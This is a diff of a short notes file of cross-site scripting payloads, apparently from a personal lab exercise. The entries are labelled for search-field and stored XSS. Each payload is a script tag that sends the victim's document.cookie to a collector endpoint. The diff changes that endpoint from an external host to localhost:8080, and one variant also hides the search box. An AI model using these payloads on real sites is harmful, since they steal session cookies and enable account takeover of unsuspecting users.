@@ -1,9 +1,10 @@
 - Script search:
 
-<script>new Image().src='http://minhpham.dal.togglebox.site/add?cookie='+document.cookie;const b = document.getElementById("search");b.style.opacity = 0;</script>
+<script>new Image().src='http://localhost:8080/add?cookie='+document.cookie;</script>
 
+<script>new Image().src='http://localhost:8080/add?cookie='+document.cookie;const b = document.getElementById("search");b.style.opacity = 0;</script>
 
 
 - Script stored:
 
-<script>new Image().src='http://minhpham.dal.togglebox.site/add?cookie='+document.cookie;</script>
+<script>new Image().src='http://localhost:8080/add?cookie='+document.cookie;</script>
